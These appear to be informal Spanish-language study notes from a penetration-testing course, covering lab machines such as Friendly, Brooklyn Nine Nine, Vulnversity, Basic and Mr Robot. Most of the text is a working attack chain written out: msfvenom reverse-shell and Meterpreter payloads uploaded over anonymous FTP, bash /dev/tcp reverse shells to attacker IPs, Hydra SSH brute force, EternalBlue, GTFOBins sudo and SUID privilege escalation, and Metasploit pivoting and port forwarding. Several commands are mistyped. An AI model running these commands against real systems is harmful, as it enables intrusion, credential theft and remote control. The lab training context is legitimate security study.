|_-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html  
80/tcp open  http    Apache httpd 2.4.54 ((Debian))  
|_http-server-header: Apache/2.4.54 (Debian)  
|_http-title: Apache2 Debian Default Page: It works  
MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)  
  
ftp 192.168.0.121  
  
usr anonymous  
pass enter  
estamos dentro  
ftp>  
  
browser ip apache  
  
msfvenom -p php/reverse_php LHOST=192.168.0.82 LPORT=443 -f raw > friendly.php  
  
ahora lo tenemos que subir a ftp  
  
ingresamos again  
  
ftp 192.168.0.121  
anonymous  
enter  
ftp> put friendly.php  
ftp> ls   
  
ftp> put friendly.php  
local: friendly.php remote: friendly.php  
229 Entering Extended Passive Mode (|||25716|)  
150 Opening BINARY mode data connection for friendly.php  
100% |************************************|  2970       39.33 MiB/s    00:00 ETA  
226 Transfer complete  
2970 bytes sent in 00:00 (4.32 MiB/s)  
ftp> ls  
229 Entering Extended Passive Mode (|||3513|)  
150 Opening ASCII mode data connection for file list  
-rw-r--r--   1 ftp      nogroup      2970 May 23 16:12 friendly.php  
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html  
226 Transfer complete  
  
ftp>exit  
  
salimos  
  
nos ponemos en escucha por el puerto 443  
  
nc -lnvp 443  
  
browser 192.168.0.121/friendly.php  
  
se actualiza y recibo coneccion con el payload  
  
  
bash -c "sh -i >& /dev/tcp/192.168.0.82/4444 0>&1"  
  
nc -lnvp 4444  
  
Tuve problemas porque no vi mi localhost entonces estaba poniendo 82 y era 83  
  
-tratamiento de la tty--  
  
script /dev/null -c bash  
  
y nos da un prompt  
  
www-data@friendly:/var/www/html$   
  
ctrl+z (para salir)  
  
ahora estando fuera=  
  
stty raw -echo; fg  
  
reset xterm  
  
exportamos las 2 variables de entorno  
  
$export TERM=xterm  
$export SHELL=bash  
  
y podemos ejecutar comando de bash sin problemas  
  

consultando en sudo -l

www-data@friendly:/var/www/html$ sudo -l

Matching Defaults entries for www-data on friendly:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:

(ALL : ALL) NOPASSWD: /usr/bin/vim

www-data@friendly:/var/www/html$

nos dice que podemos ejecutar vim como sudo en esa ruta

consultar la escalada de privilegios en esa pagina [https://gtfobins.github.io/](https://gtfobins.github.io/)

![file:///tmp/.79UXO2/22.png](file:///tmp/.79UXO2/22.png)

instrucciones

Sudo  
  
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access   
the file system, escalate or maintain privileged access.  
  
    sudo vim -c ':!/bin/sh'  
  
    This requires that vim is compiled with Python support. Prepend :py3 for Python 3.  
  
    sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  
  
    This requires that vim is compiled with Lua support.  
  
    sudo vim -c ':lua os.execute("reset; exec sh")'  
  

vamos pegando los comandos por ejemplo:

sudo vim -c ':!/bin/sh'

Pero copiando la ruta absoluta que nos indica la maquina

sudo /usr/bin/vim -c ':!/bin/sh'

y ya somos root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escalada de Privilegios en Linux – Sudo -l | Parte 2

En esta clase, veremos otro ejemplo del uso del comando sudo -l, donde podremos ver con otro ejemplo cómo enumerar binarios que podamos utilizar para escalar privilegios o ejecutar comandos como el usuario root.

Enlace para obtener la máquina vulnerable:

https://tryhackme.com/room/brooklynninenine

└─# ping -c 1 10.10.235.58 -R   
  
ttl=61 = linux  
  
└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 10.10.235.58   
  
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
| ftp-syst:   
|   STAT:   
| FTP server status:  
|      Connected to ::ffff:10.6.71.137  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 3  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)  
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)  
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Site doesn't have a title (text/html).  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
  
p21/22/80  
  
search browser ip  
  
fuente= Have you ever heard of steganography  
  

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\LO QUE SIGUE LO HICE TODO SOLO COMO UN CAMPION/////////////////////////////////////////////

ftp 10.10.235.58   (con "get" + fichero se puede descargar)  
  
anonymous  
  
pass enter  
  
ingresa p

Creo un payload con msfvenom

msfvenom -p php/reverse_php LHOST=10.6.71.137 LPORT=443 -f raw > payload.php 

Lo subo a ftp

ftp> put payload.php  
  
no se puede

Intento BRUTE FORCE con HYDRA sobre ssh

hydra -u brooklyn99 -w /usr/share/wordlists/rockyou.txt   
  
naranja

tambien fuzzing

gobuster dir -u http://10.10.235.58/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
   
 tampoco

dentro de ftp hay un fichero dedicado a “jake” asi que pruebo la fuerza bruta

hydra -u jake -w /usr/share/wordlists/rockyou.txt  
  
pass 987654321

ya estoy dentro

busco en la pag [https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

`sudo less /etc/profile`

`!/bin/sh`

copie los comando tal cual era y listo ya soy root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escalada de Privilegios en Linux – Binarios SUID

Otra técnica muy frecuente para escalar privilegios en Linux es la enumeración de binarios SUID, donde podremos conocer que binarios tienen setuid 0 y podemos utilizarlos para escalar privilegios en Linux.

Enlace para obtener la máquina vulnerable:

https://tryhackme.com/room/vulnversity

ping -c 1 10.10.77.230 -R  
ttl=62=linux  
  
nmap -p- -sSCV --open --min-rate=5000 -vvv -Pn -n 10.10.77.230  
  
21,22,445,3333  
  
search 10.10.77.230:3333  
  
gobuster dir -u http://10.10.77.230:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
  
10.10.77.230/internal  
  
msfvenom -p php/reverse_php LHOTS=MiIP LPORT=443 -f raw > payload.php  
  
es mejor poner .phtml porque sino no sube  
  
recargamos la pag de http://10.10.77.230  
  
gobuster dir -u http://10.10.77.230:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list...  
  
buscamos el payload que acabamos de subir  
  
browser http://10.10.77.230:3333/internal/uploads/  
  
si lo encontramos, recargamos la pag  
  
nos ponemos en escucha por netcat  
  
nc -lnvp 443  
   
 bash -c "sh -i >& /dev/tcp/miIP/4444 0>&1"  
  
nv -lnvp 444  
  
cerramos 443  
  
hacemos el tratamiento de tty  
  
script /dev/null -c bash  
  
y nos da un prompt  
  
www-data@friendly:/var/www/html$   
  
ctrl+z (para salir)  
  
ahora estando fuera=  
  
stty raw -echo; fg  
  
reset xterm  
  
exportamos las 2 variables de entorno  
  
$export TERM=xterm  
$export SHELL=bash  
  
nos ubicamos dentro de tmp  
  
cd /tmp  
  
  
find / -perm -4000 2>/dev/null   [busca binarios vulnerables]  
  
va aparecer un monton de binarios, con gtfobins podemos consultar cual es vulnerable/ hay algunos que no deberian estar  
  
entre otros aparece systemctl  
  
lo buscamos y aparece con la vulnerabilidad suid  
  
nos arroja un codigo que debemos guardar en un fichero  
  
nano escalada.sh  
  
TF=$(mktemp).service  
echo '[Service]  
Type=oneshot  
ExecStart=/bin/sh -c "id > /tmp/output"  
[Install]  
WantedBy=multi-user.target' > $TF  
./systemctl link $TF  
./systemctl enable --now $TF  
  
  
toca cambiar 'ExecStart=/bin/sh -c "chmod u+s /bin/bash"  
  
esto le cambia los permisos para que annyone puede ser root  
  
guardamos  
  
ejecutamos bash escalada.sh  
  
nos da error porque no esta la ruta absoluta  
  
en la siguiente linea cambiar ./systemctl   
  
./systemctl link $TF  
./systemctl enable --now $TF  
  
por /bin/systemctl  
  
/bin/systemctl link $TF  
/bin/systemctl enable --now $TF  
  
ahora si, guardamos y ejecutamos  
  
si ejecutamos $bash -p  
  
nos da un prompt de root  
  
whoami  
  
root  
  
pim pam pum

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escalada de Privilegios en Linux – Binarios SUID | Parte 2

Enlace para obtener la mÃ¡quina vulnerable:

https://vulnyx.com/#basic

└─# ping -c 1 192.168.0.143     
ttl=64

└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.143  
  
PORT    STATE SERVICE VERSION  
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)  
| ssh-hostkey:   
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)  
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)  
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)  
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))  
|_http-title: Apache2 Test Debian Default Page: It works  
|_http-server-header: Apache/2.4.56 (Debian)  
631/tcp open  ipp     CUPS 2.3  
|_http-server-header: CUPS/2.3 IPP/2.1  
|_http-title: Inicio - CUPS 2.3.3op2  
| http-robots.txt: 1 disallowed entry   
|_/

fuzzing

└─# gobuster dir -u http://192.168.0.143:631/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  

encontre el nombre dimitri asi que probe con hydra

hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.143:22

usr dimitri

pass mememe

estoy dentro

└─# ssh dimitri@192.168.0.143    
dimitri@192.168.0.143's password:   
dimitri@basic:~$ whoami  
dimitri  
dimitri@basic:~$ find / -perm -4000 2>/dev/null  
/usr/bin/env  
/usr/bin/mount  
/usr/bin/su  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/chsh  
/usr/bin/umount  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/libexec/polkit-agent-helper-1  
dimitri@basic:~$   

elijo “env” para buscar dentro de gtfobins y pimba

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

◇ `sudo install -m =xs $(which env) .`

`./env /bin/sh -p`

la rura absoluta es /usr/bin/env  
  
dimitri@basic:~$ /usr/bin/env /bin/sh -p  
# whoami  
root  
# 

ya soy root \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ TODO ESTO LO HICE SOLO COMO UN CAMPION ////////////////////////////////////////

AL final era como lo habia hecho, soy un capo.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escalada de Privilegios Autom├ítica con Metasploit en Linux & Windows

Metasploit cuenta con un módulo realmente interesante que nos permite realizar una enumeración automática de exploits que podemos utilizar en la máquina objetivo para poder escalar privilegios.

Enlace para obtener la máquina vulnerable:msfcon

https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0

primer paso, crear un payload con msfvenom=

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.83 LPORT=4444 -f exe -o virus.exe  
  
hostname -I  
192.168.0.83  
  

Es muy importante obtener un meterpreter \\\\\\\\ Y SI ES DE 64BITS? //////////////////

msfvenom -p windows/X64/meterpreter/reverse_tcp LHOST....

VEASE COMO AGREGE EL (X64)

python3 -m http.server 80

levantamos un servidor con python

ahora desde windows abrimos el navegador y ponemos la ip atacante, nos va aparecer el virus.exe, lo descargamos

desde kali linux abrimos msf

msf>use /multi/handler  
  
msf exploit(multi/handler)> show options  
  
set LHOST MI IP  
  
set PAYLOAD TIENE QUE SER EL MISMO QUE CREAMOS CON MSFVENOM  
  
OSEA DIGAMOS  
  
set PAYLOAD windows/meterpreter/reverse_tcp  
  
run

# ejecutamos el virus en windows y automaticamente se nos abre una sesion en meterpreter

## pelotudo

pero estamos dentro de cmd y tenemos que tener una shell

salimos

y nos vuelve a meterpreter

meterpreter> background

msf exploit(multi/handler) > search local_exploit_suggester

es una tool donde busca exploit para escalar privilegios

msf post(multi/recon/local_exploit_suggester) > show options  
  
nos pide la session   
  
>session -l  
  
y nos muestra las sesiones activas  
  
seleccionamos, en este caso es   
  
set SESSION 1  
  
run  
  
nos aparecen un monton de exploit, los rojos hay que ignorarlos, solo usar los verdes  
  
probar uno a uno todos los putos exploit hasta que funcione  
  
-_-  
  
supongamos que seleccionamos este  
  
msf exploit(windows/local/tokenmagic) > show options  
  
set SESSION 1  
set LHOST  
  
  
es recomendable a esta altura, cambiar el puerto, por ejemplo 5555  
  
  
run  
  
y ahora tenemos privilegios  
  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EnumeraciĆ³n de Usuarios en Sistemas Windows

En esta clase, vamos a conocer el funcionamiento del comando net users para poder ver los usuarios existentes dentro de un sistema windows, de tal forma que podremos, lo cual nos brindará mucha información para continuar con la post-explotación o para dar respuesta a las preguntas del test.

Enlace para obtener la máquina vulnerable:

https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0

CUANTOS USUARIOS HAY DENTRO DE LA MAQUINA WINDOWS?

net users

hacemos una intrusion con msf

search eternalblue  
  
msf exploit(windows/smb/ms17_010_eternalblue) > show options  
  
set RHOSTS iptarget  
  
run  
  
meterpreter> shell  
  
C:\Windows\system32> net users  
  
a primera vista vemos 3 usuarios pero....  
  
DONE!!!!!!!!!!!!!!  
 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# PIVOTING CON METASPLOIT

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# PresentaciĆ³n del Mapa de Red

Damos comienzo a la parte de pivoting dentro de este curso, donde explicaremos brevemente cómo será el escenario de red al que vamos a enfrentarnos.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Pivoting en Entornos Windows

Enlace para obtener las mÃ¡quinas utilizadas:

[https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0](https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0)

https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

configuramos la red para el pivoting, basicamente es crear una red

windows tiene interfaz 192.168.0.152 y como sub 10.10.10.0/24

Empezamos con la intrusion a windows

arp-scann -I wlan0 --localnet

192.168.0.152

nmap

msf search eternalblue

explotamos

nos da una sesion de meterpreter

ipconfig

aparece unas interfaces como que son varias

![file:///tmp/.79UXO2/23.png](file:///tmp/.79UXO2/23.png)

  
  
  
10.10.10.4  
  
crtl+z  

![file:///tmp/.79UXO2/24.png](file:///tmp/.79UXO2/24.png)

abandonamos la session

IMPORTANTE'''''''''''''' ES SESSIONS EN PLURAL, PELOTUDO!!!!!!!!!!

msf> sessions -l

usamos un modulo para descubrir host en una red

use windows/gather/arp_scanner

![file:///tmp/.79UXO2/25.png](file:///tmp/.79UXO2/25.png)

nos pide nada mas que dos cosas

rhosts y sessions

nos fijamos que sessions es con sessions -l

y la ponemos, set SESSIONS 1

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

set RHOSTS 10.10.10.4/24 (TARGET) ///////////////////////////////////////////////////////////////////

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

RUN

![file:///tmp/.79UXO2/26.png](file:///tmp/.79UXO2/26.png)

apareceran varias la que termina en 1o2 son puerta de enlace, ademas muestra la misma mac

atacar a todas las maquinolas

[en este caso es la 10.10.10.5]

ahora hay que enrutar el trafico

use multi/manage/autoroute

este modulo nos pide solo la sessions, asi que la cargamos

![file:///tmp/.79UXO2/27.png](file:///tmp/.79UXO2/27.png)

ahora hay que hacer un escaneo de puertos abiertos

use scanner/portscan/tcp

set rhosts 101010.5

run

![file:///tmp/.79UXO2/28.png](file:///tmp/.79UXO2/28.png)

![file:///tmp/.79UXO2/29.png](file:///tmp/.79UXO2/29.png)

ESPERAR A QUE SE CARGUE EL SCANEO

use post/wondows/manage/portproxy

connect_address 10.10.10.5

connect_port ponemos el puerto por donde queremos acceder example 80

((((((si preguntan que servicio corre por el puerto x, poner en ese caso, el puerto por el cual preguntan)))))))

set LOCAL_ADDRESS 0.0.0.0

set LOCAL_PORT (el que vos quieras) 65 por ejemplo

![file:///tmp/.79UXO2/30.png](file:///tmp/.79UXO2/30.png)

pim pam pum listo

browser ip windows 7 .... 192.168.0.5:5555

![file:///tmp/.79UXO2/31.png](file:///tmp/.79UXO2/31.png)

accedemos al puerto 80 de la maquina subnet

DONE!!!!!!!!!!!!!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# PreparaciĆ³n del Laboratorio de Pivoting en Linux

Enlace para obtener las mÃ¡quinas vulnerables:

https://hackmyvm.eu/machines/machine.php?vm=Friendly

https://vulnyx.com/#basic

configuramos la maquina friendly con una segunda interfaz de red 10.10.10.0/24 como red nat y la maquina basic solo con la red nat

apr-scan -I wlan0 --localnet  
  
192.168.0.121  
  
nmap -p- -sSCV --open --min-rate 5000 -Pn -n 192.168.0.121  
  
port open 21 allowed anonymous whitout pass  
  
port open 80 apache  

creamos un payload

msfvenom -p php/reverse_php/ LHOST=192.168.0.121 LPORT=443 -f raw > exploit.php

iniciamos sesion en ftp

ftp 192.168.0.121  
ls  
ftp> put exploit.php

subimos el payload

nos ponemos a la escucha con netcat

nc -lnvp 443

recargamos la pag de apache y se activa el payload

generamos otra coneccion

nc -lnvp 4444

redireccionamos la coneccion

nc -lnvp 443  
  
bash -c "sh -i >& /dev/tcp/192.168.0.121/4444 0>&1"

y ahora se nos conecta directamente por el puerto 4444

salimos y creamos un payload

msfvenom linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.83 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus

levantamos un servidor en python y lo compartimos

python3 -m http.server 80

y dentro de la sesion iniciada, corriendo por el p4444, descargamos el fichero

wget 192.168.0.83/virus

se crasheo msfvenom -_-

tuve que cambiar la arquitectura de payload pero va todo viento en popa

msfvenom linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.83 LPORT=4444 -f elf

abri msfconsole, cargue multi/handler y cargue el payload linux/x64/meterpreter/reverse_tcp

hacemos el tratamiento de la tty para tener una shell copada

script /dev/null -c bash

y nos da un prompt

www-data@friendly:/var/www/html$

ctrl+z (para salir)

ahora estando fuera=

stty raw -echo; fg

reset xterm

exportamos las 2 variables de entorno

$export TERM=xterm

$export SHELL=bash

nos ubicamos dentro de tmp

cd /tmp

find / -perm -4000 2>/dev/null [busca binarios vulnerables]

no encontre ningun binario vulnerable

pero levante un servidor con python y pude descargar con wget el payload que antes no me dejaba

elevo los permisos del payload

chmod +x payload

./payload

y en la terminal de msf al quedar escuchando con multi/handler se inicia sesion con meterpreter

meterpreter> shell  
whoami  
www-date  

asi no se puede hacer pivoting, asi que salimos de meterpreter y dentro de la consola linux ejecutamos sudo -l

NO SE TE HABIA OCURRIDO ANTES, PELOTUDO

sudo -l  
/usr/bin/vim  

- `sudo vim -c ':!/bin/sh'`

pim pam pum, i am root

script /dev/null  
#  

ya habiendo escalado privilegios dentro de meterpreter:

meterpreter> ipconfig

vemos las interfaces de red y damos con la 10.10.10.6

salimos con crtl + z

msf> sessions -l   
nos muestra la sesion abierta

ENRUTAMOS EL TRAFICO CON: AUTOROUTE

msf> use multi/manage/autoroute

Autoroute nos pide solo la session, asi que la agregamos

set SESSION 2

corremos y vemos el enrutamiento

![file:///tmp/.79UXO2/32.png](file:///tmp/.79UXO2/32.png)

Ahi se ve como se enruto el trafico

creamos un scaner

#!/bin/bash  
  
for i in {1..255}; do  
    timeout 1 bash -c "ping 10.10.10.$i" >/dev/null  
    if [ $? -eq 0 ]; then  
       echo "El host 10.10.10.$i esta activo"  
    fi  
done  

levantamos un servidor

python3 -m http.server 80

vamoa a la shell de meterpreter

msf>session -l  
  
msf> sessions -i 2  
  
meterpreter> shell  
  
wget 192.168.0.83/scanner.sh  
  

me estaba dando un error y era el path

![file:///tmp/.79UXO2/33.png](file:///tmp/.79UXO2/33.png)

ahora le damos permisos de ejecucion tales como

chmod u+x scanner.sh

al final lo cambie por todos los permisos

chmod 777 escanner.sh

tambien modifique el fichero

sustitui la line de “ping 10.10.10.$i”

por

"ping -c 1 10.10.10.$i"

ahora al ejecutarlo me da que hay 5 host alive

ahora salimos de la shell, meterpreter y cargamos un modulo arp de msf

msf> use scanner/portscan/tcp

![file:///tmp/.79UXO2/34.png](file:///tmp/.79UXO2/34.png)

PORTFORTWARDING

Me traigo el puerto 22 y el 631 al puerto que quiera, por ejemplo 4545 o 12345

ingresamos a meterpreter;

msf>sessions -l  
msf> sessions -i 2  
meterpreter>

meterpreter> portfwd add -l 222 -p 22 -r 10.10.10.8  
meterpreter > portfwd add -l 5000 -p 631 -r 10.10.10.8  

ahora hydra al p 222

tambien al p 5000

la maquinola es dimitri, ya la vimos anteriormente

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# LABORATORIOS DE LA PARTE PRACTICA

![file:///tmp/.79UXO2/35.png](file:///tmp/.79UXO2/35.png)https://tryhackme.com/room/mrrobot

http = 80

https = 443

Fuerza Bruta a WORDPRESS

wpscan --url https://10.10.10.4/ --passwords /usr/share/wordlists/rockyou.txt --usernames Elliot

si no funciona, ir probando todos los directorios

BASE64

c

echo 'saf9a6td97sa6' | base64 -d

en el dashboard

![file:///tmp/.79UXO2/36.png](file:///tmp/.79UXO2/36.png)

appearance-editor-(en este caso lo pone en la pag 404) es lo mas logico

msfvenom -p php/reverse_php LHOST=10.8.100.91 LPORT=443 -f raw > payload

inyectamos el codigo en el template

RECORDAD QUE ESTO ESTA DENTRO DE content

explotamos el payload / nos ponemos en escucha por nc 443, abrimos la conexion con nc 444

bash -c "sh -i >& /dev/tcp/192.168.0.83/4444 0>&1"

pivoteamos entre usuarios

find / -perm -4000 2>/dev/null

escalamos privilegios sudo -l o suid

no se pudio

nmap --interactive

nmap>!whoami

>root

or

nmap>!sh

>root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

en la maquina basic

`find / -perm -4000 -exec ls -la {} \; 2>/dev/null`

find / -name user.txt -o -name root.txt | xargs cat

y lees las flags

solo como un campion hice la maquinola basic

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

dentro de una maquinola encontro el puerto 21 abierto con anonymous y sin pass, luego en los archivos encontro un .sh en donde borro el contenido y puso

bash -i >0 /dev/tcp/192.168.0.1/443 0>&1

primero lo bajo con “get” y luego de moficarlo lo subio con “put” abrio un nueva terminal con

nc -lnvp 443

y recibio la coneccion, hace el tratamiento de la tty

script /dev/null -c bash

crlt z para salir y pasarlo a segundo plano y dentro de otra terminal

stty raw echo; fg  
  
reset xterm  
  
export TERM=xterm  
export SHELL=bash  

ahora hay una shell ma mejor

escalamos privilegios:

sudo -l  
no funciono  
  
find / -perm -4000 2>/dev/null

si encontramos el binario “env” es fija que lo explotamos

---



#### METODOLOGIA A SEGUIR PARA RENDIR EL EXAMEN

arp-scan

cada ip crear un nodo, screen, os, basicamente hacer un wrhiteup de cada host que encuentre. Y si encontramos una subnet crear un subnodo con las ip

![file:///tmp/.79UXO2/37.png](file:///tmp/.79UXO2/37.png)
